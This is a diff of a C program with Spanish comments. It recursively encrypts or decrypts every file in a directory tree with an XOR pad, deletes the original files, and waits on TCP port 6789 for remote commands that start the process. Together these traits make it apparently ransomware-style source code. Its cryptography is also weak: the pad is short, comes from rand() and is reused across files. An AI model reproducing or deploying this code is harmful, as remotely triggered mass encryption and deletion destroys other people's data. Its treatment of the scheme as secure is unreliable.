@@ -12,8 +12,8 @@
 #include <fcntl.h>  //para usar funcion open
 #define BUF_SIZE 4096 // Buffer
 
-#define PORT 6789  
-#define length_path 100
+#define PORT 6789
+#define length_path 200
 #define pad_size 3		//tamano en KB del archivo pad.pad
 int otpEncrypt(char n_ifile[], char n_ofile[], char n_pad[]){
 	/*
@@ -61,7 +61,7 @@ int otpDecrypt(char n_ifile[], char n_ofile[], char n_pad[]) {
 		Devuelve 0 si se descifro de manera correcta, -3 si no se pudo
 		abrir el archivo n_ifile o el n_pad
 	*/
-	char c_read, c_random, c_write;
+	char c_read, c_pad, c_write;
 	//Sockets de conexion con los archivos
 	//n_ifile y n_pad deben existir, n_ofile se sobreescribe
 	FILE *ifile = fopen(n_ifile, "r"), *ofile = fopen(n_ofile, "w+");
@@ -70,9 +70,9 @@ int otpDecrypt(char n_ifile[], char n_ofile[], char n_pad[]) {
 		//Se lee cada caracter del archivo n_ifile
 		while ((c_read = fgetc(ifile)) != EOF) {
 			//Se lee el caracter de cifrado correspondiente
-			c_random = fgetc(npad);
+			c_pad = fgetc(npad);
 			//Se descifra el mensaje
-			c_write = c_read ^ c_random;
+			c_write = c_read ^ c_pad;
 
 			fputc(c_write, ofile);
 		}
@@ -149,6 +149,36 @@ long int getFileSize(char *file){
 	return len;
 }
 
+int decryptFile(char *cwd, char *file){
+	/*
+		Funcion que prepara los parametros necesarios
+		para poder cifrar el archivo dado como parametro
+	*/
+	char tmp[200] = {0};
+	char *outFile = calloc((strlen(file) + 5),sizeof(char));
+	strcat(outFile, file);
+	//El archivo cifrado se llamara [file].enc
+	for (int x = 0; x < (strlen(outFile) - 4); x++)
+        tmp[x] = outFile[x];
+	strcpy(outFile, tmp);
+	char *pad = calloc((strlen(cwd) + 9), sizeof(char));
+	strcat(pad, cwd);
+	//El nombre del PAD con el que se cifrara el archivo es
+	//[cwd]/pad.pad
+	strcat(pad, "/pad.pad\0");
+	printf("Dec:\n");
+	printf("\t%s\n\t%s\n ", file, pad);
+	//El archivo pad.pad no se cifrara, por eso se excluye con el condicional
+	//if (strcmp(file, pad) != 0)
+	//	printf("\t%s\n\t%s", outFile, pad);
+		otpDecrypt (file, outFile, pad);
+
+	free(outFile);
+	free(pad);
+
+	return 0;
+}
+
 int encryptFile(char *cwd, char *file){
 	/*
 		Funcion que prepara los parametros necesarios
@@ -164,15 +194,16 @@ int encryptFile(char *cwd, char *file){
 	//[cwd]/pad.pad
 	strcat(pad, "/pad.pad\0");
 	printf("enc:\n");
-	printf("\t%s\n\t%s\n ", outFile, pad);
+	printf("\t%s\n\t%s\n ", file, pad);
 	//El archivo pad.pad no se cifrara, por eso se excluye con el condicional
 	//if (strcmp(file, pad) != 0)
 	//	printf("\t%s\n\t%s", outFile, pad);
-	
+		otpEncrypt(file, outFile, pad);
+
 	free(outFile);
 	free(pad);
-	
-	return 0;	
+
+	return 0;
 }
 
 char * getAbsPath(char *current_file, char *dir){
@@ -206,18 +237,22 @@ int makePadFile(char *abs_path){
 	printf("\t%s\n", pad);
 	//Semilla para obtener los caracteres pseudo-aleatoriamente
 	srand(time(NULL));
-	if((pad_file = fopen(pad, "w+")) != NULL){
-		for(i = pad_size*1024; i > 0; i--){
-			//Generamos el caracter pseudo-aleatorio
-			//Se le suma 32 para evitar los caracteres de control (codigo ASCII)
-			c_random = (char)(rand()%126) + 32;
-			fputc(c_random, pad_file);
+	// Si el archivo exixte en la carpeta no lo creara
+	if( access( pad, F_OK ) == -1 ){ // El archivo no exixte
+		if((pad_file = fopen(pad, "w+")) != NULL){
+			for(i = pad_size*1024; i > 0; i--){
+				//Generamos el caracter pseudo-aleatorio
+				//Se le suma 32 para evitar los caracteres de control (codigo ASCII)
+				c_random = (char)(rand()%126) + 32;
+				fputc(c_random, pad_file);
+			}
+			fclose(pad_file);
+			free(pad);
+			printf("\t0\n");
+			return 0;
 		}
-		fclose(pad_file);
-		free(pad);
-		printf("\t0\n");
-		return 0;
 	}
+
 	//Si resulta error al abrir el archivo
 	free(pad);
 	printf("\t-1\n");
@@ -233,7 +268,7 @@ int getFilesinDir(char *cwd){
 	*/
 	DIR *d;
     struct dirent *dir;
-    char c, abs_path_file[length_path];
+    char c, abs_path_file[length_path]={0};
     d = opendir(cwd);
     //Si se tiene un apuntador diferente de NULL
     if (d){
@@ -242,11 +277,17 @@ int getFilesinDir(char *cwd){
         {
 			//Si es archivo comun, se llama a encryptFile para encriptarlo
 			// Si el tipo de archivo es igual a 8 se trata de un archivo comun
-			if (dir->d_type == 8 && dir->d_name[0] != '.'){ // Es un archivo
-				strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
-				printf("sendenc:%s\n%s\n", cwd, abs_path_file);
-            	encryptFile(cwd, abs_path_file);
-            }
+					if (dir->d_type == 8 && dir->d_name[0] != '.'){ // Es un archivo
+						if (strcmp(dir->d_name, "pad.pad") != 0) { // Para no agregar el archivo pad.pad
+							if (strcmp(dir->d_name, "sayCYA") != 0) { // Para no agregar el archivo sayCYA
+								strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
+								printf("sendenc:%s\n%s\n", cwd, abs_path_file);
+	          //encryptFile(cwd, abs_path_file);
+						decryptFile(cwd, abs_path_file);
+						DelFiles(abs_path_file);
+							}
+        		}
+					}
             //Si es un subdirectorio, se llama de manera recursiva a la funcion con
             //la ruta absoluta del subdirectorio
 			// Si el tipo de archivo es igual a 4 se trata de un directorio
@@ -281,8 +322,8 @@ int conecta(){
 		perror("Error al agregar la opcion SO_REUSEADDR en setsockopt");//----Mensaje que se quita en cuanto termine la creacion-----
 
 	//Establece la familia correspondiente al protocolo
-	host_addr.sin_family = AF_INET;     // 
-	//big endian 
+	host_addr.sin_family = AF_INET;     //
+	//big endian
 	host_addr.sin_port = htons(PORT);   //
 	host_addr.sin_addr.s_addr = INADDR_ANY; // Asigno mi IPP
 	memset(&(host_addr.sin_zero), '\0', 8); // El resto de la estructura en 0s
@@ -293,7 +334,7 @@ int conecta(){
 	if (listen(sockfd, 5) == -1)
 		perror("Error al escuchar en el socket");//----Mensaje que se quita en cuanto termine la creacion-----
 
-	while(1) { 
+	while(1) {
 		sin_size = sizeof(struct sockaddr_in);
 		new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
 		if(new_sockfd == -1)
@@ -301,7 +342,7 @@ int conecta(){
 		send(new_sockfd, "Conexion aceptada. Comienza a teclear\n", 38, 0);
 		recv_length = recv(new_sockfd, &buffer, 6, 0);
 		while(recv_length > 0) {
-			
+
 			printf("RECV: %d bytes\nENTRADA: %s...", recv_length, buffer);//----Mensaje que se quita en cuanto termine la creacion-----
 			if(strcmp(buffer, "encr\n") == 0)//  command: encr
 				/*Aqui iria la funcion de cifrado*/
@@ -319,7 +360,7 @@ int conecta(){
 			}
 			else
 				send(new_sockfd, "No se proceso correctamente\n", 28, 0);
-			
+
 			memset(buffer, 0, sizeof(buffer));
 			recv_length = recv(new_sockfd, &buffer, 6, 0);
 		}
